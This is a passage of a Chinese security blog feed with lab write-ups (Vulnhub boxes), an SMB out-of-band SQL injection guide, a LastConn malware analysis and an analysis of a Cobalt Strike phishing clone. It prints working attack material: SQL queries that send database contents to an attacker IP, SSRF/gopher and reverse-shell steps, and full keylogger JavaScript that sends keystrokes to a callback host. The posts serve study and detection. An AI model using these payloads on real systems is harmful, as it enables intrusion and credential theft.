alt=""></p><p>这里还顺便踩了smb的坑，用自带的smb服务，不要用imapcket的smbserver.py。否则会报句柄错误</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;漏洞介绍&quot;&gt;&lt;a href=&quot;#漏洞介绍&quot; class=&quot;headerlink&quot; title=&quot;漏洞介绍&quot;&gt;&lt;/a&gt;漏洞介绍&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;Windows Print Spooler 远程代码执行漏洞&lt;br&gt;CVE-2021-1675&lt;b</summary>
      
    
    
    
    
    <category term="域渗透" scheme="http://422926799.github.io/tags/域渗透/"/>
    
  </entry>
  
  <entry>
    <title>mysql smb外带注入</title>
    <link href="http://422926799.github.io/posts/af61cc76.html"/>
    <id>http://422926799.github.io/posts/af61cc76.html</id>
    <published>2021-06-29T14:19:23.000Z</published>
    <updated>2021-06-29T14:28:09.743Z</updated>
    
    <content type="html"><![CDATA[<p>需求：secure_file_priv为空，目标系统为windows<br>smb设置如下：</p><pre><code>找到 security = user ， 旧版本将user 改为share，这里我用的新版本，需要在后面添加：map to guest = Bad User新设置一个smbsmb日志:/var/log/samba</code></pre><p><img src="https://z3.ax1x.com/2021/06/29/RwuE9S.png" alt=""></p><p>smb外带注入与DNS外带注入比较:</p><ol><li>smb外带注入 可以一次性提交更大长度的字符，经测试长度在120是没有问题的，而dns前缀最多是63个字符。而且对特殊字符的兼容性比较好，目前测试发现 *是不行的，其他还有待fuzz。</li><li>smb外带注入不依赖于dns，可以绕过目前流量监测设备对异常域名前缀的捕获，可以直接使用ip，不需要dns请求。</li></ol><p>构造sql语句：</p><pre><code>select load_file(concat(&quot;\\\\&lt;IP&gt;\\&quot;,(SQL语句),&quot;\\xxx&quot;))为了方便从log里提取查询的内容，可以构造如下语句select load_file(concat(&quot;\\\\10.23.79.94\\yayi[&quot;,database(),&quot;]\\1.txt&quot;));</code></pre><p><img src="https://z3.ax1x.com/2021/06/29/RwuJc4.png" alt=""></p><p>查询当前数据库里的表</p><pre><code>1. 使用limit2. substring截断</code></pre><p>使用limit请先获取总共的表数</p><pre><code>select load_file(concat(&quot;\\\\10.23.79.94\\yayi[&quot;,(select count(table_name) from information_schema.tables where table_schema=database()),&quot;]\\1.txt&quot;));</code></pre><p>再用limit逐个查询</p><pre><code>select load_file(concat(&quot;\\\\10.23.79.94\\yayi[&quot;,(select table_name from information_schema.tables where table_schema=database() limit 0,1),&quot;]\\1.txt&quot;));</code></pre><p><img src="https://z3.ax1x.com/2021/06/29/RwKS8U.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/06/29/RwKp2F.png" alt=""></p><p>substring截断<br>截断到120字符串即可</p><pre><code>select load_file(concat(&quot;\\\\10.23.79.94\\yayi[&quot;,(select substring((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,120)),&quot;]\\1.txt&quot;));</code></pre><p><img src="https://z3.ax1x.com/2021/06/29/RwKAV1.png" alt=""></p><p>还有另外种方法就是利用smb获取ntlm hash，适用于知道目标一定的凭证。利用responder获取ntlm v2然后爆破<br><img src="https://z3.ax1x.com/2021/06/29/RwKUxg.png" alt=""></p><p>参考链接:<a href="http://moonslow.com/article/smb_sql_injection" target="_blank" rel="noopener">http://moonslow.com/article/smb_sql_injection</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;需求：secure_file_priv为空，目标系统为windows&lt;br&gt;smb设置如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;找到 security = user ， 旧版本将user 改为share，这里我用的新版本，需要在后面添加：
map to guest = Bad </summary>
      
    
    
    
    
    <category term="Writing" scheme="http://422926799.github.io/tags/Writing/"/>
    
  </entry>
  
  <entry>
    <title>LastConn 样本简陋分析</title>
    <link href="http://422926799.github.io/posts/519d2f5e.html"/>
    <id>http://422926799.github.io/posts/519d2f5e.html</id>
    <published>2021-06-19T17:35:48.000Z</published>
    <updated>2021-06-19T17:55:09.539Z</updated>
    
    <content type="html"><![CDATA[<h2 id="事件来源"><a href="#事件来源" class="headerlink" title="事件来源"></a>事件来源</h2><p>事件来源：<a href="https://www.proofpoint.com/us/blog/threat-insight/new-ta402-molerats-malware-targets-governments-middle-east" target="_blank" rel="noopener">https://www.proofpoint.com/us/blog/threat-insight/new-ta402-molerats-malware-targets-governments-middle-east</a></p><h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><p>由.NET开发<br><img src="https://z3.ax1x.com/2021/06/20/Rimgyj.png" alt=""></p><p>使用混淆器混淆过，de4dot 也无法完全反混淆，但它能够清除一些混淆<br>完全混淆：<br><img src="https://z3.ax1x.com/2021/06/20/Rim2Os.png" alt=""></p><p>部分混淆清除后:<br><img src="https://z3.ax1x.com/2021/06/20/RimWmn.png" alt=""></p><p>入口点</p><pre><code class="c#">private static void LsfApkF4M(){            Application.EnableVisualStyles(); //启用视觉样式            if (Program.nigDBMdtyE5deZClpF != null)            {            }            Application.SetCompatibleTextRenderingDefault(false); //在应用程序范围内设置控件显示文本的默认方式(true使用GDI+方式显示文本|false使用GDI方式显示文本.)            if (Program.V9yJ8yp9ahRYqnZDsG())  //Program.nigDBMdtyE5deZClpF == null            {                w4X4wl9MxwlqqYZEne.cBFhC9cq2dv3Z();                if (Program.nigDBMdtyE5deZClpF == null)                {                    Application.Run(new Form1());                }            }}</code></pre><p>进入到cBFhC9cq2dv3Z函数（判断当前时间减去 2021/6/16/时间戳判断是否大于14天）<br><img src="https://z3.ax1x.com/2021/06/20/Rim5kV.png" alt=""></p><p>大于或等于14天，在 2021-06-16 之后 14 天不能运行，过了这一步检测。进入Form1函数<br><img src="https://z3.ax1x.com/2021/06/20/RimIYT.png" alt=""></p><p>获取主机名+当前用户名<br><img src="https://z3.ax1x.com/2021/06/20/RimofU.png" alt=""></p><p>用户路径的临时文件夹路径获取<br><img src="https://z3.ax1x.com/2021/06/20/Rim7pF.png" alt=""></p><p>检查是否有域的存在<br><img src="https://z3.ax1x.com/2021/06/20/RimHl4.png" alt=""></p><p>获取系统制造商名称<br><img src="https://z3.ax1x.com/2021/06/20/Rimb6J.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/06/20/RimqX9.png" alt=""></p><p>解密资源文件里无名的资源<br><img src="https://z3.ax1x.com/2021/06/20/RimOmR.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/06/20/RimX01.png" alt=""></p><p>经过解密得到的为一份配置文件<br><img src="https://z3.ax1x.com/2021/06/20/RimztK.png" alt=""></p><pre><code>txt_Totime=60 //超时时间@txt_Ftime=50@txt_FristTimeConn=45@txt_PathDir=C:\Users\Public\Downloads //下载存放路径@txt_PassRar=1D1VQB4G8Q //压缩包解压密码@txt_Mutex=NVQAGGMV22CY37LNUO9T5CZVS@txt_KeyPath=SOFTWARE\Box@txt_LastConn=LastConn.txt@txt_ShellCode=ShellCode.txt@txt_ListFile=ListFile.txt@txt_isdownload=isdownload.txt@txt_FileToDown=FileToDown.txt@txt_TokenRunOne=O1P6jtSegunFJIAAAAAAAAAAS-BcSjDEdrK0SsV7BAHes97oBWke06Lhg8ThncuyCCy@txt_FileName=Viewfile //下载的压缩包名@txt_MyToken=O1PWT9LGL1As7EAAAAAAAAAAe6Oc-OILc7Y0SU9OIAFll1nElPBz_uE467zscqimYfd@txt_FileOpen=news.doc //诱饵文档@txt_Setting=Setting</code></pre><p>打开注册表路径HKEY_CURRENT_USER\SOFTWARE\Box，如果不存在则创建。然后从该路径读取名为OneFile的键值名称，如果不存在会退出进程，存在则进入到yExgOgDEb函数调用<br><img src="https://z3.ax1x.com/2021/06/20/Rin9pD.png" alt=""></p><p>先返回系统的语言<br><img src="https://z3.ax1x.com/2021/06/20/RinC1e.png" alt=""></p><p>返回系统版本信息<br><img src="https://z3.ax1x.com/2021/06/20/RinP6H.png" alt=""></p><p>返回一系列信息，然后上传到远端，利用Dropbox API 下载Viewfile.rar<br>利用rar命令行解压压缩包<br><img src="https://z3.ax1x.com/2021/06/20/RiniXd.png" alt=""></p><p>根据原文的报告，会从此处下载<br><img src="https://z3.ax1x.com/2021/06/20/RinA0I.png" alt=""></p><blockquote><p>第四个也是最后一个能力是命令处理。“txt_FileToDown”文件是使用“txt_Setting”文件中收到的身份验证令牌从 Dropbox 下载的。如果有任何命令要执行，该文件将包含换行符分隔的“<command>=<command arguments="">”条目。命令包括：<br>DFileDrop – 下载并执行托管在恶意软件 Dropbox 上的文件<br>DFromUrl – 下载并执行托管在 URL 上的文件<br>Cmd – 执行 cmd.exe 命令并通过“txt_ShellCode”文件将结果发送回恶意软件的 Dropbox<br>Powershell – 类似于“Cmd”，但适用于 Powershell<br>WMIC - 类似于“Cmd”，但用于 WMIC<br>ListFile – 获取指定的文件列表并将结果通过“txt_ListFile”文件发送回恶意软件的 Dropbox<br>UploadFiles – 在恶意软件的 Dropbox 上创建文件夹并将指定的文件上传到其中<br>屏幕截图 – 截取屏幕截图并上传到恶意软件的 Dropbox<br>GetIP – 通过 hxxps://api.ipify.org 获取 IP 地址并上传到恶意软件的 Dropbox<br>执行命令后，其条目将从“txt_FileToDown”文件中删除，并将该文件重新上传到恶意软件的 Dropbox。   </p></blockquote><p>该杨本所有混淆字符串解密：<a href="https://github.com/EmergingThreats/threatresearch/blob/master/LastConn/decrypted_strs.txt" target="_blank" rel="noopener">https://github.com/EmergingThreats/threatresearch/blob/master/LastConn/decrypted_strs.txt</a><br>沙盒链接：<a href="https://www.hybrid-analysis.com/sample/cb76a31e0e3759721290ea00ad65d2c194adceb9d77907e97159d82ee0311dde/60cad3c23992d956906e976a" target="_blank" rel="noopener">https://www.hybrid-analysis.com/sample/cb76a31e0e3759721290ea00ad65d2c194adceb9d77907e97159d82ee0311dde/60cad3c23992d956906e976a</a></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>混淆的cs，配合Dropbox做c2是个不错的选择</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;事件来源&quot;&gt;&lt;a href=&quot;#事件来源&quot; class=&quot;headerlink&quot; title=&quot;事件来源&quot;&gt;&lt;/a&gt;事件来源&lt;/h2&gt;&lt;p&gt;事件来源：&lt;a href=&quot;https://www.proofpoint.com/us/blog/threat-insigh</summary>
      
    
    
    
    
    <category term="恶意分析" scheme="http://422926799.github.io/tags/恶意分析/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub ARAGOG</title>
    <link href="http://422926799.github.io/posts/21b3e8d6.html"/>
    <id>http://422926799.github.io/posts/21b3e8d6.html</id>
    <published>2021-06-16T12:46:42.000Z</published>
    <updated>2021-06-16T13:18:25.393Z</updated>
    
    <content type="html"><![CDATA[<p>靶场链接:<a href="http://www.vulnhub.com/entry/harrypotter-aragog-102,688/" target="_blank" rel="noopener">http://www.vulnhub.com/entry/harrypotter-aragog-102,688/</a></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>开局nmap<br><img src="https://z3.ax1x.com/2021/06/16/2XcHoQ.png" alt=""></p><p>gobuster web扫描<br><img src="https://z3.ax1x.com/2021/06/16/2XcOWn.png" alt=""></p><p>访问/blog发现是个wordpress<br><img src="https://z3.ax1x.com/2021/06/16/2XgR7F.png" alt=""></p><p>需要添加hosts  (这里我已经添加了)<br><img src="https://z3.ax1x.com/2021/06/16/2X2FHS.png" alt=""></p><p>wpscan扫描wordpress<br>（存在wp-admin用户）<br><img src="https://z3.ax1x.com/2021/06/16/2X2e9s.png" alt=""></p><p>插件扫描,存在wp-file-manager插件，版本6.0</p><pre><code>wpscan --url http://aragog.hogwarts/blog -t 20 --plugins-detection aggressive</code></pre><p><img src="https://z3.ax1x.com/2021/06/16/2X2e9s.png" alt=""></p><p>这个版本存在任意文件上传，利用该洞getshell即可<br><img src="https://z3.ax1x.com/2021/06/16/2XRCG9.png" alt=""></p><p>得到shell<br><img src="https://z3.ax1x.com/2021/06/16/2XRix1.png" alt=""></p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>得到flag，并得知/home目录下查找ginny和hagrid98用户<br><img src="https://z3.ax1x.com/2021/06/16/2XRtIg.png" alt=""></p><p>原本以为/var/www/html下是存放wordpress的路径，查看后发现不是。最后在/usr/share/wordpress发现数据库配置文件</p><pre><code>find / -maxdepth 5 -type f -writable 2&gt; /dev/null | grep -v &quot;/proc&quot;find / -maxdepth 5 -type f -writable 2&gt; /dev/null | grep -v &quot;/proc&quot; | grep &quot;config&quot;</code></pre><p><img src="https://z3.ax1x.com/2021/06/16/2XR4Q1.png" alt=""></p><p>查询数据库得到wp-admin用户的密码</p><pre><code>use wordpress;select * from wp_users;</code></pre><p><img src="https://z3.ax1x.com/2021/06/16/2XRjSA.png" alt=""></p><p>cmd5查询得到密码<br><img src="https://z3.ax1x.com/2021/06/16/2XWpef.png" alt=""></p><p>ssh撞密码得<br><img src="https://z3.ax1x.com/2021/06/16/2XWVln.png" alt=""></p><p>后续常规linux提权检测发现没有有用的东西，上pspy检测root权限的进程，最后发现有个定时任务执行/opt/.backup.sh<br><img src="https://z3.ax1x.com/2021/06/16/2XWBfH.png" alt=""></p><p>里面插入反弹shell等待即可获得root shell<br><img src="https://z3.ax1x.com/2021/06/16/2XW6Xt.png" alt=""></p><h2 id="wp-file-任意文件上传分析"><a href="#wp-file-任意文件上传分析" class="headerlink" title="wp-file 任意文件上传分析"></a>wp-file 任意文件上传分析</h2><p>漏洞点位于file manager的connector.minimal.php文件，具体路径在wordpress\wp-content\plugins\wp-file-manager\lib\php\connector.minimal.php<br><img src="https://z3.ax1x.com/2021/06/16/2XW7Xq.png" alt=""></p><p>首先实例化一个elFinderConnector对象，然后调用它的run()方法，跟进run()<br>跟进到FILES数据判断<br><img src="https://z3.ax1x.com/2021/06/16/2XfpcR.png" alt=""></p><p>最后调用exec函数进入到文件上传处理点<br><img src="https://z3.ax1x.com/2021/06/16/2XfAAO.png" alt=""></p><p>Upload函数（关键点是Content-Type类型存在image即进入文件保存）<br><img src="https://z3.ax1x.com/2021/06/16/2Xf8US.png" alt=""></p><p>详细分析链接:<a href="https://www.anquanke.com/post/id/216990" target="_blank" rel="noopener">https://www.anquanke.com/post/id/216990</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;靶场链接:&lt;a href=&quot;http://www.vulnhub.com/entry/harrypotter-aragog-102,688/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://www.vulnhub.com/entry/harry</summary>
      
    
    
    
    
    <category term="靶场练习" scheme="http://422926799.github.io/tags/靶场练习/"/>
    
  </entry>
  
  <entry>
    <title>Vulnhub HarryPotter:Nagini</title>
    <link href="http://422926799.github.io/posts/a52d611e.html"/>
    <id>http://422926799.github.io/posts/a52d611e.html</id>
    <published>2021-06-14T15:53:34.000Z</published>
    <updated>2021-06-14T18:07:28.924Z</updated>
    
    <content type="html"><![CDATA[<p>vulnhub链接：<a href="http://www.vulnhub.com/entry/harrypotter-nagini,689/" target="_blank" rel="noopener">http://www.vulnhub.com/entry/harrypotter-nagini,689/</a></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>开局nmap</p><pre><code>nmap -sV -A 192.168.93.225</code></pre><p><img src="https://z3.ax1x.com/2021/06/15/2HE0Gd.png" alt=""></p><p>gobuster扫web</p><pre><code>gobuster dir -e -u http://192.168.93.225 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,zip,rar,7z</code></pre><p><img src="https://z3.ax1x.com/2021/06/14/2HAxDf.png" alt=""></p><p>有个joomla CMS，进入后台就能通过模板getshell，除此之外还有个note.txt。访问如下<br><img src="https://z3.ax1x.com/2021/06/15/2HEXi4.png" alt=""></p><blockquote><p>提示用http3访问quic.nagini.hogwarts，将域添加进/etc/hosts</p></blockquote><p>得到提示的路径<br><img src="http://www.vxer.cn/zb_users/upload/2021/05/202105071620395007860213.png" alt="vxer.cn的图"></p><p>访问internalResourceFeTcher.php，存在SSRF漏洞<br>读取internalResourceFeTcher.php源码</p><pre><code>file:///var/www/html/internalResourceFeTcher.php</code></pre><p><img src="https://z3.ax1x.com/2021/06/15/2HVidO.png" alt=""> </p><p>读取/etc/passwd<br><img src="https://z3.ax1x.com/2021/06/15/2HVVWd.png" alt=""></p><p>读取joomla CMS数据库配置文件</p><pre><code>file:///var/www/html/joomla/configuration.php</code></pre><p><img src="https://z3.ax1x.com/2021/06/15/2HVuOP.png" alt=""></p><p>可以发现mysql没使用密码进行登录，意味着可以用ssrf访问mysql<br>》MySQL客户端连接并登录服务器时存在两种情况：需要密码认证以及无需密码认证。当需要密码认证时使用挑战应答模式，服务器先发送salt然后客户端使用salt加密密码然后验证；当无需密码认证时直接发送TCP/IP数据包即可。所以在非交互模式下登录并操作MySQL只能在无需密码认证，未授权情况下进行</p><h2 id="突破口"><a href="#突破口" class="headerlink" title="突破口"></a>突破口</h2><p>利用gopherus.py生成gopher payload<br><a href="https://github.com/tarunkant/Gopherus" target="_blank" rel="noopener">https://github.com/tarunkant/Gopherus</a></p><p><img src="https://z3.ax1x.com/2021/06/15/2HV2Ox.png" alt=""></p><blockquote><p>注意:然后我们必须使用浏览器的 url 访问该站点。（curl 在这里不起作用。）如果没有显示内容，只需刷新页面几次。<br><img src="https://z3.ax1x.com/2021/06/15/2HVWm6.png" alt=""></p></blockquote><p>数据库版本<br><img src="https://z3.ax1x.com/2021/06/15/2HVwwT.png" alt=""></p><p>查看joomla数据库所有表<br><img src="https://z3.ax1x.com/2021/06/15/2HZkn0.png" alt=""></p><p>读取joomla_users<br><img src="https://z3.ax1x.com/2021/06/15/2HZABV.png" alt=""></p><p>查看后发现hash无法破解，直接将md5替换掉site_admin的用户然后在登录即可<br><img src="https://z3.ax1x.com/2021/06/15/2HZeNF.png" alt=""></p><p>登录后台<br>joomla/administrator<br><img src="https://z3.ax1x.com/2021/06/15/2HZu9J.png" alt=""></p><p>找到模板处写shell<br>(尝试phpinfo)<br><img src="https://z3.ax1x.com/2021/06/15/2HZK39.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/06/15/2HZQj1.png" alt=""></p><p>php_reverse_shell<br><img src="https://z3.ax1x.com/2021/06/15/2HZwjI.png" alt=""></p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>home目录下有两个用户snape,hermoine<br><img src="https://z3.ax1x.com/2021/06/15/2HZDDP.png" alt=""></p><p>在/home/snape目录下找到hermoine用户的ssh密码<br><img src="https://z3.ax1x.com/2021/06/15/2HuYqI.png" alt=""></p><p>登录后利用发现的SUID cp文件，将ssh公钥拷贝到/home/hermoine/.ssh/authorized_keys<br><img src="https://z3.ax1x.com/2021/06/15/2HuNZt.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/06/15/2HuUdP.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/06/15/2HuaIf.png" alt=""></p><p>实现私钥登录hermoine用户<br><img src="https://z3.ax1x.com/2021/06/15/2Huwi8.png" alt=""></p><p>用户目录下存在firefox的数据，scp下载到本地解密得到root密码<br><a href="https://github.com/unode/firefox_decrypt/releases/tag/0.7.0" target="_blank" rel="noopener">https://github.com/unode/firefox_decrypt/releases/tag/0.7.0</a><br><img src="https://z3.ax1x.com/2021/06/15/2Hu0JS.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/06/15/2HuBRg.png" alt=""></p><p>得到最后的flag<br><img src="https://z3.ax1x.com/2021/06/15/2HuDzQ.png" alt=""></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="http://www.vxer.cn/?id=80" target="_blank" rel="noopener">http://www.vxer.cn/?id=80</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;vulnhub链接：&lt;a href=&quot;http://www.vulnhub.com/entry/harrypotter-nagini,689/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://www.vulnhub.com/entry/harr</summary>
      
    
    
    
    
    <category term="靶场" scheme="http://422926799.github.io/tags/靶场/"/>
    
  </entry>
  
  <entry>
    <title>hacksudo fgo</title>
    <link href="http://422926799.github.io/posts/2f666841.html"/>
    <id>http://422926799.github.io/posts/2f666841.html</id>
    <published>2021-06-10T12:16:16.000Z</published>
    <updated>2021-06-10T12:30:42.215Z</updated>
    
    <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>开局nmap扫描<br><img src="https://z3.ax1x.com/2021/06/10/2RY6O0.png" alt=""></p><p>开放了80、21、3306、22</p><p>路径扫描<br><img src="https://z3.ax1x.com/2021/06/10/2RYRTU.png" alt=""></p><p>访问dict.txt得到一份字典，ftp爆破。得到正确密码<br><img src="https://z3.ax1x.com/2021/06/10/2RYXkD.png" alt=""></p><p>ftp登录上去，发现两个目录。东西全部下载下来<br><img src="https://z3.ax1x.com/2021/06/10/2RtAAS.png" alt=""></p><p>其中压缩包里wav后缀结尾的文件是凯撒加密，解密得到后台密码<br><img src="https://z3.ax1x.com/2021/06/10/2Rtm1s.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/06/10/2RtUj1.png" alt=""></p><p>文件上传copy改名得到shell</p><p><img src="https://z3.ax1x.com/2021/06/10/2Rt69H.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/06/10/2RtDAO.png" alt=""></p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>得到shell<br><img src="https://z3.ax1x.com/2021/06/10/2RtggA.png" alt=""></p><p>发现SUID<br><img src="https://z3.ax1x.com/2021/06/10/2Rt5E8.png" alt=""></p><p>利用look读取/etc/shadow<br><img src="https://z3.ax1x.com/2021/06/10/2RtzUU.png" alt=""></p><p>john破解hash<br><img src="https://z3.ax1x.com/2021/06/10/2RNC8J.png" alt=""></p><p>登录得到user.txt，发现该用户目录下存在二进制文件fog<br><img src="https://z3.ax1x.com/2021/06/10/2RNEb6.png" alt=""></p><p>经过IDA分析，发现是setuid(0)/setguid(0)后调用python，而属主是root。可利用其提权<br><img src="https://z3.ax1x.com/2021/06/10/2RNrq0.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/06/10/2RNtIS.png" alt=""></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h2&gt;&lt;p&gt;开局nmap扫描&lt;br&gt;&lt;img src=&quot;https://z3.ax1x.com/2021/06/10/2RY6O0.pn</summary>
      
    
    
    
    
    <category term="靶场练习" scheme="http://422926799.github.io/tags/靶场练习/"/>
    
  </entry>
  
  <entry>
    <title>cs钓鱼克隆网站分析</title>
    <link href="http://422926799.github.io/posts/9efc32ef.html"/>
    <id>http://422926799.github.io/posts/9efc32ef.html</id>
    <published>2021-06-10T09:49:12.000Z</published>
    <updated>2021-06-10T09:54:48.840Z</updated>
    
    <content type="html"><![CDATA[<h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><p>cs克隆<br><img src="https://z3.ax1x.com/2021/06/10/2RieSA.png" alt=""></p><p>克隆后的html和原html对比<br><img src="https://z3.ax1x.com/2021/06/10/2RilTS.png" alt=""></p><p>特征：</p><ol><li>IFRAME标签为大写，且长宽为0。</li><li>script标签加载了js路径为”/jquery/jquery.min.js”</li></ol><p>顺序特征:</p><ol><li>IFRAME标签和script标签同时出现时，一定是IFRAME标签、script标签和body标签这个顺序。</li><li>IFRAME标签和script标签只出现一个时，一定在body标签之前。</li></ol><p>引用的js分析：</p><pre><code class="javascript">var cfqPdaQzXzSSf = 0;window.onload = function loadfqPdaQzXzSSf() { //页面加载处理事件    lfqPdaQzXzSSf = &quot;,&quot;;    if (window.addEventListener)  { //对象触发指定的事件        document.addEventListener(&#39;keypress&#39;, pfqPdaQzXzSSf, true); //keypress所有键都会触发该事件，无论它们是否产生字符值 处理函数:pfqPdaQzXzSSf        document.addEventListener(&#39;keydown&#39;, dfqPdaQzXzSSf, true); //keydown当按下某个键时会触发该事件 处理函数:dfqPdaQzXzSSf    } else if (window.attachEvent)  { //attachEvent在IE9以下的版本中受到支持。其它的都支持addEventListener        document.attachEvent(&#39;onkeypress&#39;, pfqPdaQzXzSSf);        document.attachEvent(&#39;onkeydown&#39;, dfqPdaQzXzSSf);    } else { //两者都不支持全部置空        document.onkeypress = pfqPdaQzXzSSf;        document.onkeydown = dfqPdaQzXzSSf;    }}function pfqPdaQzXzSSf(e) {    kfqPdaQzXzSSf = (window.event)?window.event.keyCode:e.which; //只有当DOM事件处理程序被调用的时    kfqPdaQzXzSSf = kfqPdaQzXzSSf.toString(16); //将键盘码转换为ascii    if (kfqPdaQzXzSSf != &quot;d&quot;)  { //随便写个判断进入函数        fqPdaQzXzSSf(kfqPdaQzXzSSf);    }}function dfqPdaQzXzSSf(e) {    kfqPdaQzXzSSf = (window.event)?window.event.keyCode:e.which;    if (kfqPdaQzXzSSf == 9||kfqPdaQzXzSSf == 8||kfqPdaQzXzSSf == 13)  { //tab键，退格键，回车键        fqPdaQzXzSSf(kfqPdaQzXzSSf);    }}function fqPdaQzXzSSf(kfqPdaQzXzSSf) {    lfqPdaQzXzSSf = lfqPdaQzXzSSf + kfqPdaQzXzSSf + &quot;,&quot;; //键盘值拼接    var tfqPdaQzXzSSf = &quot;ZUyQXfawhPbi&quot; + cfqPdaQzXzSSf;    cfqPdaQzXzSSf++;    var ffqPdaQzXzSSf;    if (document.all&amp;&amp;(navigator.appVersion.match(/MSIE ([\d.]+)/)[1]) &lt;= 8.0)  { //浏览器版本判断是否小于或等于8.0        ffqPdaQzXzSSf = document.createElement(String.fromCharCode(60) + &quot;script name=&#39;&quot;+tfqPdaQzXzSSf+&quot;&#39; id=&#39;&quot;+tfqPdaQzXzSSf+&quot;&#39;&quot; + String.fromCharCode(62) + String.fromCharCode(60) + &quot;/script&quot; + String.fromCharCode(62));    } else {        ffqPdaQzXzSSf = document.createElement(&quot;script&quot;);        ffqPdaQzXzSSf.setAttribute(&quot;id&quot;, tfqPdaQzXzSSf);        ffqPdaQzXzSSf.setAttribute(&quot;name&quot;, tfqPdaQzXzSSf);    }    var ejDBFWFHhff = &#39;?id=&#39; + window.location.href.split(/\?id=/)[1]; //取键盘ascii码    ffqPdaQzXzSSf.setAttribute(&quot;src&quot;, &quot;http://10.23.66.18:8080/callback&quot; + ejDBFWFHhff + &quot;&amp;data=&quot; + lfqPdaQzXzSSf);    ffqPdaQzXzSSf.style.visibility = &quot;hidden&quot;;    document.body.appendChild(ffqPdaQzXzSSf); //实例化js，发送键盘码    if (kfqPdaQzXzSSf == 13||lfqPdaQzXzSSf.length &gt; 3000)  { //判断键盘码为回车键置空lfqPdaQzXzSSf变量        lfqPdaQzXzSSf = &quot;,&quot;;    }    setTimeout(&#39;document.body.removeChild(document.getElementById(&quot;&#39; + tfqPdaQzXzSSf + &#39;&quot;))&#39;, 5000); //延时5秒删除创建的js}</code></pre><p>页面加载处理事件,添加针对键盘按下的事件。触发事件的时候进入dfqPdaQzXzSSf和dfqPdaQzXzSSf函数处理，最后调用fqPdaQzXzSSf函数，将键盘码通过创建script标签将数据传送到远端。最后延迟5秒后删除创建的js</p><p>pfqPdaQzXzSSf函数：<br>键盘码转ascii码发送到fqPdaQzXzSSf函数</p><p>dfqPdaQzXzSSf函数：<br>如果按下tab键，退格键，回车键调用fqPdaQzXzSSf函数发送键盘</p><p><strong>chrome动态调试</strong><br><img src="https://z3.ax1x.com/2021/06/10/2RiDkF.png" alt="键盘码判断"></p><p><img src="https://z3.ax1x.com/2021/06/10/2RirY4.png" alt="键盘码拼接"></p><p><img src="https://z3.ax1x.com/2021/06/10/2Ri7pd.png" alt="js创建发送键盘码到远端"></p><p>cs远端接收的密码<br><img src="https://z3.ax1x.com/2021/06/10/2RiqXt.png" alt=""></p><p>360空间绘测特征搜索：</p><pre><code>response:&quot;&lt;head&gt; &lt;base href=&quot; AND response:&quot;&lt;link rel=\&quot;shortcut icon\&quot; type=\&quot;image/x-icon\&quot; href=\&quot;/favicon.ico\&quot;&gt;&quot; AND response:&quot;jquery/jquery.min.js\&quot;&gt;&lt;/script&gt; &lt;/body&gt;&quot;response:&quot;&lt;head&gt; &lt;base href=&quot; AND response:&quot;&lt;link rel=\&quot;shortcut icon\&quot; type=\&quot;image/x-icon\&quot; href=\&quot;/favicon.ico\&quot;&gt;&quot; AND response:&quot;WIDTH=\&quot;0\&quot; HEIGHT=\&quot;0\&quot;&gt;&lt;/IFRAME&gt;&quot;</code></pre><p><img src="https://z3.ax1x.com/2021/06/10/2RF9pj.png" alt=""></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://mp.weixin.qq.com/s/1lZlqxTuEcS3VK1Ve8XDbA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/1lZlqxTuEcS3VK1Ve8XDbA</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;分析过程&quot;&gt;&lt;a href=&quot;#分析过程&quot; class=&quot;headerlink&quot; title=&quot;分析过程&quot;&gt;&lt;/a&gt;分析过程&lt;/h2&gt;&lt;p&gt;cs克隆&lt;br&gt;&lt;img src=&quot;https://z3.ax1x.com/2021/06/10/2RieSA.png&quot; a</summary>
      
    
    
    
    
    <category term="恶意分析" scheme="http://422926799.github.io/tags/恶意分析/"/>
    
  </entry>
  
  <entry>
    <title>仿造Brown-Forman恶意文档分析</title>
    <link href="http://422926799.github.io/posts/5245e2ed.html"/>
    <id>http://422926799.github.io/posts/5245e2ed.html</id>
